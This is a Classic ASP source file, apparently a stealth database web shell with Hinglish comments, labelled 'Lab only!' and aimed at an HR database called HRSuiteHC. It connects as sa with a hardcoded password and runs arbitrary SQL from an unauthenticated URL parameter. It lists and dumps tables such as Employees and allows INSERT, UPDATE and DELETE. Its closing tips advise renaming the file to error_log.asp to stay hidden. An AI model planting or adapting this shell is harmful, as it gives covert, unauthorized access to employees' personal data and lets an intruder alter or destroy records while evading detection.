<%@ Language=VBScript %>
<%
' Stealth Classic ASP DB Manager - Connected to HRSuiteHC (Lab only!)

Dim Conn, RS, ConnStr, ErrMsg
Dim act, qry, tbl, dbn

dbn = "HRSuiteHC"   ' Tere DB name
act = Request("act")
qry = Request("query")
tbl = Request("tbl")

ConnStr = "Provider=SQLNCLI11;Server=tcp:ATT-N-ACC,1433;Database=" & dbn & ";Uid=sa;Pwd=HRPass123;"

' Agar IP mil gaya hai to yeh use kar (better)
' ConnStr = "Provider=SQLNCLI11;Server=tcp:192.168.1.50,1433;Database=" & dbn & ";Uid=sa;Pwd=HRPass123;"

Set Conn = Server.CreateObject("ADODB.Connection")
On Error Resume Next
Conn.Open ConnStr
If Err.Number <> 0 Then
    ErrMsg = "Connection Failed: " & Err.Description
    Response.Write "<div style='color:red; background:#300; padding:15px;'>" & ErrMsg & "</div>"
    Response.End
End If
On Error Goto 0
%>

<html>
<head><title>Stealth DB Manager - HRSuiteHC</title></head>
<body style="font-family:consolas; background:#000; color:#0f0; padding:20px;">

<h2>Stealth DB Shell - HRSuiteHC Connected</h2>
<p>Server: ATT-N-ACC | DB: HRSuiteHC | User: sa</p>

<!-- Custom Query Run Kar -->
<h3>Custom SQL Query Run Karo</h3>
<form method="get">
    Query: <input name="query" size="90" value="SELECT TOP 10 * FROM Employees"><br><br>
    <input type="submit" value="Execute">
</form>

<% If qry <> "" Then %>
    <h4>Query Result: <%=Server.HTMLEncode(qry)%></h4>
    <%
    Set RS = Conn.Execute(qry)
    If Not RS.EOF Then
        Response.Write "<table border='1' cellspacing='0' cellpadding='5' style='border-color:#0f0; background:#111;'>"
        Response.Write "<tr style='background:#222;'>"
        For Each fld In RS.Fields
            Response.Write "<th>" & fld.Name & "</th>"
        Next
        Response.Write "</tr>"
        Dim rowCnt : rowCnt = 0
        Do While Not RS.EOF And rowCnt < 200
            Response.Write "<tr>"
            For Each fld In RS.Fields
                Response.Write "<td>" & Server.HTMLEncode(fld.Value & "") & "</td>"
            Next
            Response.Write "</tr>"
            RS.MoveNext
            rowCnt = rowCnt + 1
        Loop
        Response.Write "</table>"
        If rowCnt >= 200 Then Response.Write "<p>(Showing first 200 rows only)</p>"
    Else
        Response.Write "<p style='color:yellow;'>Query chal gaya (no data ya INSERT/UPDATE/DROP).</p>"
    End If
    RS.Close
    %>
<% End If %>

<!-- Tables List -->
<h3>Tables in HRSuiteHC</h3>
<%
Set RS = Conn.Execute("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' ORDER BY TABLE_NAME")
Do While Not RS.EOF
    Dim tblName : tblName = RS("TABLE_NAME")
    Response.Write "<a href='?act=browse&tbl=" & Server.URLEncode(tblName) & "' style='color:#0ff;'>" & tblName & "</a><br>"
    RS.MoveNext
Loop
RS.Close
%>

<!-- Browse Table Data -->
<% If act = "browse" And tbl <> "" Then %>
    <h3>Data from <%=Server.HTMLEncode(tbl)%> (top 100 rows)</h3>
    <%
    Set RS = Conn.Execute("SELECT TOP 100 * FROM [" & tbl & "]")
    If Not RS.EOF Then
        Response.Write "<table border='1' cellspacing='0' cellpadding='5' style='border-color:#0f0; background:#111;'>"
        Response.Write "<tr style='background:#222;'>"
        For Each fld In RS.Fields
            Response.Write "<th>" & fld.Name & "</th>"
        Next
        Response.Write "</tr>"
        Do While Not RS.EOF
            Response.Write "<tr>"
            For Each fld In RS.Fields
                Response.Write "<td>" & Server.HTMLEncode(fld.Value & "") & "</td>"
            Next
            Response.Write "</tr>"
            RS.MoveNext
        Loop
        Response.Write "</table>"
    Else
        Response.Write "<p style='color:yellow;'>Table khali ya access issue.</p>"
    End If
    RS.Close
    %>
<% End If %>

<p style="color:#888; margin-top:30px;">
Tips:<br>
- Query mein SELECT, INSERT, UPDATE, DELETE sab chalega (permission ho to).<br>
- Table name click kar data dekh.<br>
- Agar error aaye to custom query se test kar: SELECT @@version<br>
- Stealth ke liye filename change kar (e.g. error_log.asp).
</p>

</body>
</html>

<%
If IsObject(RS) Then RS.Close
If IsObject(Conn) Then Conn.Close
%>
